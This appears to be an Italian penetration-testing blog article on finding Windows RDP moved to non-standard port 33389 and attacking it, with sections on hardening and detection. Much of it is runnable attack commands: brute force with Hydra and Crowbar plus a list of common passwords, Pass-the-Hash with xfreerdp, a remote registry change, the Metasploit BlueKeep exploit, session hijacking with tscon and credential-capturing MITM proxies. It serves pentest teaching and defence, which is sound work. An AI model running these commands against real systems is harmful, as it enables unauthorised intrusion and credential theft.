---
title: 'Porta 33389 RDP: Trovare e Sfruttare RDP su Porte Non Standard'
slug: porta-33389-rdp-alternate
description: 'RDP spostato sulla 33389? nmap -sV lo trova in secondi. BlueKeep, Pass-the-Hash e brute force funzionano identici. Cambiare porta non è sicurezza — è un placebo.'
image: /porta-33389-rdp-alternate.webp
draft: true
date: 2026-04-21T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - rdp
  - bluekeep
---

Ogni pentester ha avuto questa conversazione:

*"Non preoccupatevi, abbiamo spostato RDP dalla 3389 alla 33389. Gli attaccanti non la troveranno."*

Questa è **security through obscurity** — e non funziona. La porta 33389 TCP (e le sue varianti: 13389, 3390, 3391, 43389, 53389) è una delle porte alternative più comuni per il Remote Desktop Protocol di Windows. Le aziende la spostano per evitare gli scan automatici dei botnet sulla [porta 3389](https://hackita.it/articoli/porta-3389-rdp), convinte che cambiare numero di porta equivalga a proteggere il servizio. In realtà, basta un `nmap -sV` per identificare RDP su qualsiasi porta — il protocollo ha un handshake riconoscibile che non puoi nascondere cambiando il numero.

Il paradosso è che i server con RDP su porte non standard sono spesso **meno protetti** di quelli sulla 3389: gli admin che spostano la porta pensano di aver "risolto il problema" e non implementano le vere contromisure (NLA, MFA, VPN, rate limiting). Il risultato è un server RDP esposto su Internet senza protezioni reali, nascosto dietro un numero di porta diverso che qualsiasi tool di scan trova in secondi.

Ne ho visti decine. Un caso emblematico: azienda di consulenza, 15 dipendenti, RDP sulla 33389 esposto su Internet, password `Company2025!` per l'utente Administrator. "Ma avevamo cambiato la porta!" mi hanno detto. Come se mettere il lucchetto sul retro della casa rendesse inutile quello davanti.

## Perché le Aziende Spostano RDP

Le ragioni sono sempre le stesse, e nessuna è valida come unica contromisura:

* **Evitare bot e scanner** — i botnet scansionano la 3389 in massa. Spostare la porta riduce il rumore nei log (meno tentativi di brute force automatico) ma non ferma un attaccante motivato
* **Compliance superficiale** — alcuni auditor segnalano "porta 3389 aperta" come finding. Spostando la porta, il finding scompare dal report (ma il rischio no)
* **Falsa sensazione di sicurezza** — "se non è sulla porta standard, nessuno la trova"
* **Conflitti di porta** — più server RDP dietro lo stesso IP pubblico con port forwarding diversi (33389→server1:3389, 33390→server2:3389)

## 1. Come Trovare RDP su Porte Non Standard

### Nmap — service detection

```bash
# Scan con service detection su range ampio
nmap -sV -p 3389,33389,13389,3390,3391,43389,53389,8389 10.10.10.40

# Oppure scan completo (lento ma trova tutto)
nmap -sV --allports 10.10.10.40

# Scan veloce su range di porte comuni per RDP
nmap -sV -p 3300-3400,13389,23389,33389,43389,53389 10.10.10.40
```

```
PORT      STATE SERVICE
33389/tcp open  ms-wbt-server  Microsoft Terminal Services
```

`ms-wbt-server` → è RDP, indipendentemente dalla porta.

### Nmap script RDP

```bash
# Enumerazione completa RDP
nmap -p 33389 --script rdp-enum-encryption,rdp-ntlm-info 10.10.10.40
```

```
PORT      STATE SERVICE
33389/tcp open  ms-wbt-server
| rdp-ntlm-info:
|   Target_Name: CORP
|   DNS_Domain_Name: corp.local
|   DNS_Computer_Name: WEB-01.corp.local
|   Product_Version: 10.0.20348
|_  System_Time: 2026-02-14T12:00:00+00:00
| rdp-enum-encryption:
|   Security layer
|     CredSSP (NLA): SUCCESS
|     Native RDP: SUCCESS
|   RDP Encryption level: High
|_  RDP Protocol Version: 10.7
```

**Intelligence ricchissima** — senza autenticazione, solo dall'handshake:

* **Target\_Name: CORP** → nome del dominio [Active Directory](https://hackita.it/articoli/active-directory)
* **DNS\_Domain\_Name: corp.local** → dominio DNS interno
* **DNS\_Computer\_Name: WEB-01.corp.local** → hostname esatto del server
* **Product\_Version: 10.0.20348** → Windows Server 2022
* **NLA: SUCCESS** → Network Level Authentication attiva (buono per la difesa, ma non blocca tutto)

### Masscan — scan veloce su larga scala

```bash
# Scan veloce su un intero /16 per la porta 33389
masscan 10.10.0.0/16 -p 33389 --rate 10000 -oL results.txt
```

## 2. Attacchi su RDP (Porta 33389 = Porta 3389)

Una volta identificato RDP sulla 33389, **tutti gli attacchi sono identici alla [porta 3389](https://hackita.it/articoli/porta-3389-rdp)**. La porta è diversa, il protocollo è lo stesso. Devi solo aggiungere `:33389` o `-port 33389` ai tool.

### Brute Force

```bash
# Hydra
hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.40:33389

# Crowbar (più affidabile per RDP)
crowbar -b rdp -s 10.10.10.40/32 -u administrator -C /usr/share/wordlists/passwords.txt -p 33389

# Ncrack
ncrack -p 33389 --user administrator -P wordlist.txt 10.10.10.40
```

Le password più comuni che trovo su RDP esposti:

| Password       | Frequenza                        |
| -------------- | -------------------------------- |
| `Password1`    | Altissima                        |
| `Company2025!` | Alta (variante col nome azienda) |
| `Welcome1!`    | Alta                             |
| `P@ssw0rd`     | Alta                             |
| `Admin123!`    | Media                            |
| `Summer2025!`  | Media (stagionale)               |
| `Changeme1!`   | Media                            |

### Pass-the-Hash su RDP

Se hai un hash NTLM (da [SAM dump](https://hackita.it/articoli/pass-the-hash), [Mimikatz](https://hackita.it/articoli/mimikatz), [secretsdump](https://hackita.it/articoli/pass-the-hash)):

```bash
# PtH richiede Restricted Admin Mode abilitato
xfreerdp /v:10.10.10.40:33389 /u:administrator /pth:32ed87bdb5fdc5e9cba88547376818d4 /d:CORP
```

Se Restricted Admin non è abilitato, abilitalo da remoto (se hai accesso via [SMB](https://hackita.it/articoli/smb)/[WinRM](https://hackita.it/articoli/porta-5985-winrm)):

```bash
crackmapexec smb 10.10.10.40 -u administrator -H 'HASH' -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0 /f'
```

Poi `xfreerdp` con PtH sulla 33389.

### CVE — BlueKeep e Derivati

Le CVE di RDP si applicano **indipendentemente dalla porta**.

**CVE-2019-0708 — BlueKeep (CVSS 9.8)**

```bash
# Verifica
nmap -p 33389 --script rdp-vuln-ms12-020 10.10.10.40

# Metasploit check
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS 10.10.10.40
set RPORT 33389
run
```

```bash
# Exploit (instabile — può causare BSOD)
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS 10.10.10.40
set RPORT 33389
set TARGET 2  # Seleziona target corretto (Windows 7, Server 2008)
run
```

BlueKeep è **pre-auth, wormable** — colpisce Windows 7, Server 2008/2008 R2 senza NLA.

**CVE-2019-1181/1182 — DejaBlue**

Estensione di BlueKeep a Windows 10 e Server 2019. Stesso vettore, porte diverse non cambiano nulla.

### Session Hijacking RDP

Se sei già admin su una macchina Windows e altri utenti hanno sessioni RDP attive:

```powershell
# Lista sessioni attive
query user

# Hijack una sessione senza password (da SYSTEM)
tscon SESSION_ID /dest:console

# Se non sei SYSTEM, usa PsExec per elevare
psexec -s -i cmd.exe
tscon 2 /dest:console
```

Funziona identicamente indipendentemente dalla porta — è un attacco locale.

### Man-in-the-Middle RDP

Se NLA non è abilitata o il certificato è self-signed:

```bash
# Seth (RDP MITM)
python3 seth.py eth0 10.10.10.200 10.10.10.40 33389

# PyRDP (RDP proxy — cattura credenziali e registra la sessione)
pyrdp-mitm 10.10.10.40:33389 --listen 3389
```

L'utente si connette al tuo proxy pensando di raggiungere il server → catturi credenziali in chiaro e registri l'intera sessione video.

## 3. Enumerazione Senza Credenziali

Anche senza accesso, l'handshake RDP rivela informazioni preziose:

```bash
# rdp-ntlm-info rivela dominio, hostname, versione OS
nmap -p 33389 --script rdp-ntlm-info 10.10.10.40

# Certificato TLS del server RDP
openssl s_client -connect 10.10.10.40:33389 2>/dev/null | openssl x509 -text -noout
```

Il certificato può contenere: **hostname interno** nel CN, **dominio** nel SAN, **organizzazione**. Stessa tecnica della [porta 8443](https://hackita.it/articoli/porta-8443-https-alt).

## 4. Scenari Reali: Port Forwarding e Multi-Server

La porta 33389 è spesso usata in scenari di **port forwarding** dove un firewall/router mappa porte diverse a server diversi:

```
Internet                Firewall               Server interni
┌──────────┐           ┌──────────┐            ┌─────────────┐
│ Attacker │──33389──►│ NAT      │──3389────►│ Server 1    │
│          │──33390──►│          │──3389────►│ Server 2    │
│          │──33391──►│          │──3389────►│ Server 3    │
└──────────┘           └──────────┘            └─────────────┘
```

Questo significa che se trovi 33389, 33390, 33391 sullo stesso IP → sono tre server diversi dietro NAT. Ognuno è un target separato con hostname e credenziali potenzialmente diverse.

```bash
# Scan per trovare tutti i mapping
nmap -sV -p 33389-33400 10.10.10.40
```

```bash
# Per ogni porta, estrai info
for port in 33389 33390 33391; do
    echo "=== Port $port ==="
    nmap -p $port --script rdp-ntlm-info 10.10.10.40 2>/dev/null | grep -E "Target|DNS_Computer|Product"
done
```

```
=== Port 33389 ===
Target_Name: CORP
DNS_Computer_Name: DC-01.corp.local
Product_Version: 10.0.20348

=== Port 33390 ===
Target_Name: CORP
DNS_Computer_Name: WEB-01.corp.local
Product_Version: 10.0.20348

=== Port 33391 ===
Target_Name: CORP
DNS_Computer_Name: DB-01.corp.local
Product_Version: 10.0.17763
```

Tre server: un Domain Controller, un web server e un database server. Il DB-01 è su Windows Server 2019 (17763) — potenzialmente meno patchato.

## 5. Come Proteggersi Davvero (Non Cambiando Porta)

Cambiare la porta RDP **non è una contromisura di sicurezza** — è una riduzione del rumore. Le vere protezioni sono:

* **VPN** — RDP mai esposto direttamente su Internet, solo via VPN
* **NLA (Network Level Authentication)** — autenticazione prima della sessione grafica, mitiga BlueKeep e MITM
* **MFA** — Azure MFA, Duo, o Windows Hello for Business
* **Gateway RDP** — Microsoft RD Gateway (porta 443) come proxy autenticato
* **Account Lockout Policy** — blocco dopo N tentativi falliti
* **Firewall IP whitelist** — se devi esporre RDP, solo da IP noti
* **Certificato TLS valido** — non self-signed, per prevenire MITM
* **Credential Guard** — protegge le credenziali in memoria da [Mimikatz](https://hackita.it/articoli/mimikatz)
* **Restricted Admin Mode** — disabilitalo se non necessario (previene [PtH](https://hackita.it/articoli/pass-the-hash) ma ha trade-off)
* **Patch** — BlueKeep e DejaBlue sono fixati da anni, ma i server non patchati esistono ancora

## 6. Detection

| Event ID           | Log                                      | Indica                               |
| ------------------ | ---------------------------------------- | ------------------------------------ |
| **4625**           | Security                                 | Login fallito — brute force in corso |
| **4624** (Type 10) | Security                                 | Login RDP riuscito                   |
| **4778**           | Security                                 | Session reconnected                  |
| **4779**           | Security                                 | Session disconnected                 |
| **1149**           | TerminalServices-RemoteConnectionManager | Connessione RDP ricevuta (pre-auth)  |

```powershell
# Trova login RDP riusciti
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4624} |
  Where-Object {$_.Properties[8].Value -eq 10} |
  Select-Object TimeCreated, @{N='User';E={$_.Properties[5].Value}}, @{N='Source';E={$_.Properties[18].Value}}
```

## 7. Mini FAQ

**Cambiare la porta RDP da 3389 a 33389 migliora la sicurezza?**
Marginalmente: riduce i tentativi di brute force automatico dei botnet che scansionano solo la 3389. Ma un attaccante motivato trova RDP su qualsiasi porta in secondi con `nmap -sV`. Non è una contromisura — è un placebo. Le vere soluzioni sono VPN, NLA e MFA.

**Come faccio a scansionare un'intera rete per RDP su porte non standard?**
`masscan RANGE -p 0-65535 --rate 100000` poi filtra per banner `ms-wbt-server`. Oppure `nmap -sV -p 3300-3400,13389,23389,33389,43389,53389 RANGE` per le porte alternative più comuni. Per un pentest interno, [CrackMapExec](https://hackita.it/articoli/pass-the-hash) con `crackmapexec rdp SUBNET` testa la 3389 di default.

**BlueKeep funziona anche sulla porta 33389?**
Sì — BlueKeep è una vulnerabilità nel protocollo RDP, non nella porta. Qualsiasi porta che serve RDP è vulnerabile se il sistema non è patchato. Il modulo Metasploit accetta `RPORT` customizzato.

## 8. Cheat Sheet Finale

| Azione         | Comando                                                                |
| -------------- | ---------------------------------------------------------------------- |
| Nmap           | `nmap -sV -p 33389 target`                                             |
| NTLM info      | `nmap -p 33389 --script rdp-ntlm-info target`                          |
| Encryption     | `nmap -p 33389 --script rdp-enum-encryption target`                    |
| BlueKeep check | `use auxiliary/scanner/rdp/cve_2019_0708_bluekeep` + `set RPORT 33389` |
| Brute force    | `hydra -l administrator -P wordlist rdp://target:33389`                |
| Crowbar        | `crowbar -b rdp -s target/32 -u admin -C wordlist -p 33389`            |
| xfreerdp       | `xfreerdp /v:target:33389 /u:user /p:pass`                             |
| PtH RDP        | `xfreerdp /v:target:33389 /u:admin /pth:HASH /d:DOMAIN`                |
| MITM           | `pyrdp-mitm target:33389 --listen 3389`                                |
| Cert           | `openssl s_client -connect target:33389`                               |
| Multi-port     | `nmap -sV -p 33389-33400 target` → `rdp-ntlm-info` per ciascuna        |
| Session hijack | `tscon SESSION_ID /dest:console` (da SYSTEM)                           |

***

Riferimento: Microsoft RDP Security, CVE-2019-0708, MITRE ATT\&CK T1021.001, HackTricks RDP. Uso esclusivo in ambienti autorizzati. [https://hacktricks.wiki/en/network-services-pentesting/pentesting-rdp.html](https://hacktricks.wiki/en/network-services-pentesting/pentesting-rdp.html)

> La tua azienda ha RDP esposto su Internet — su qualsiasi porta? [Il penetration test HackIta](https://hackita.it/servizi) lo trova e lo testa. Per imparare il lateral movement Windows completo: [formazione Active Directory 1:1](https://hackita.it/formazione).
